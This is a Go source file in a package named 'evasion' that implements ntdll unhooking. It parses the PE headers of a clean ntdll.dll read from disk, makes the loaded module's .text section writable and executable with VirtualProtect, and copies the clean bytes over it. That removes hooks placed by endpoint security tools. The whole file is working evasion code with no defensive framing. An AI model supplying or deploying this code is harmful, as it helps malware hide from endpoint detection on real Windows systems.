package evasion

import (
	"fmt"
	"os"
	"unsafe"

	"github.com/saferwall/pe"
	"golang.org/x/sys/windows"
)

// IMAGE_DOS_HEADER (from winnt.h)
type ImageDosHeader struct {
	EMagic    uint16     // Magic number
	ECblp     uint16     // Bytes on last page of file
	ECp       uint16     // Pages in file
	ECrlc     uint16     // Relocations
	ECparhdr  uint16     // Size of header in paragraphs
	EMinalloc uint16     // Minimum extra paragraphs needed
	EMaxalloc uint16     // Maximum extra paragraphs needed
	ESS       uint16     // Initial (relative) SS value
	ESP       uint16     // Initial SP value
	Ecsum     uint16     // Checksum
	EIP       uint16     // Initial IP value
	ECs       uint16     // Initial (relative) CS value
	Elfarlc   uint16     // File address of relocation table
	Eovno     uint16     // Overlay number
	Eres      [4]uint16  // Reserved words
	EOemid    uint16     // OEM identifier (for e_oeminfo)
	EOeminfo  uint16     // OEM information; e_oemid specific
	Eres2     [10]uint16 // Reserved words
	ELfanew   int32      // File address of new exe header
}

// IMAGE_NT_HEADERS64 (from winnt.h)
type ImageFileHeader struct {
	Machine              uint16
	NumberOfSections     uint16
	TimeDateStamp        uint32
	PointerToSymbolTable uint32
	NumberOfSymbols      uint32
	SizeOfOptionalHeader uint16
	Characteristics      uint16
}

type ImageOptionalHeader64 struct {
	Magic                       uint16
	MajorLinkerVersion          byte
	MinorLinkerVersion          byte
	SizeOfCode                  uint32
	SizeOfInitializedData       uint32
	SizeOfUninitializedData     uint32
	AddressOfEntryPoint         uint32
	BaseOfCode                  uint32
	ImageBase                   uint64
	SectionAlignment            uint32
	FileAlignment               uint32
	MajorOperatingSystemVersion uint16
	MinorOperatingSystemVersion uint16
	MajorImageVersion           uint16
	MinorImageVersion           uint16
	MajorSubsystemVersion       uint16
	MinorSubsystemVersion       uint16
	Win32VersionValue           uint32
	SizeOfImage                 uint32
	SizeOfHeaders               uint32
	CheckSum                    uint32
	Subsystem                   uint16
	DllCharacteristics          uint16
	SizeOfStackReserve          uint64
	SizeOfStackCommit           uint64
	SizeOfHeapReserve           uint64
	SizeOfHeapCommit            uint64
	LoaderFlags                 uint32
	NumberOfRvaAndSizes         uint32
	DataDirectory               [16]ImageDataDirectory
}

type ImageDataDirectory struct {
	VirtualAddress uint32
	Size           uint32
}

type ImageNtHeaders64 struct {
	Signature      uint32
	FileHeader     ImageFileHeader
	OptionalHeader ImageOptionalHeader64
}

func UnhookNtdll(ntdllBase uintptr) error {
	// 1. Load clean ntdll.dll from disk
	ntdllDisk, err := os.ReadFile("C:\\Windows\\System32\\ntdll.dll")
	if err != nil {
		return err
	}

	// 2. Parse PE headers of the disk version
	dosHeader := (*ImageDosHeader)(unsafe.Pointer(&ntdllDisk[0]))
	ntHeader := (*ImageNtHeaders64)(unsafe.Pointer(uintptr(unsafe.Pointer(&ntdllDisk[0])) + uintptr(dosHeader.ELfanew)))

	// 3. Find the .text section
	numSections := ntHeader.FileHeader.NumberOfSections
	sectionHeaderPtr := uintptr(unsafe.Pointer(ntHeader)) + unsafe.Sizeof(*ntHeader)

	for i := uint16(0); i < numSections; i++ {
		section := (*pe.ImageSectionHeader)(unsafe.Pointer(sectionHeaderPtr + (uintptr(i) * unsafe.Sizeof(pe.ImageSectionHeader{}))))

		// Check for .text section
		sectionName := string(section.Name[:5])
		if sectionName == ".text" {
			// 4. Prepare addresses
			sourceAddress := uintptr(unsafe.Pointer(&ntdllDisk[0])) + uintptr(section.PointerToRawData)
			targetAddress := ntdllBase + uintptr(section.VirtualAddress)
			size := uintptr(section.SizeOfRawData)

			// 5. Change memory protection to PAGE_EXECUTE_READWRITE
			var oldProtect uint32
			err = windows.VirtualProtect(targetAddress, size, windows.PAGE_EXECUTE_READWRITE, &oldProtect)
			if err != nil {
				return fmt.Errorf("VirtualProtect failed: %v", err)
			}

			// 6. Overwrite hooked memory with clean bytes
			copyMemory(targetAddress, sourceAddress, size)

			// 7. Restore original protection
			windows.VirtualProtect(targetAddress, size, oldProtect, &oldProtect)
			fmt.Printf("Successfully unhooked %s section at 0x%X\n", sectionName, targetAddress)
			break
		}
	}
	return nil
}

// Helper to copy memory directly
func copyMemory(dst, src, size uintptr) {
	for i := uintptr(0); i < size; i++ {
		*(*byte)(unsafe.Pointer(dst + i)) = *(*byte)(unsafe.Pointer(src + i))
	}
}
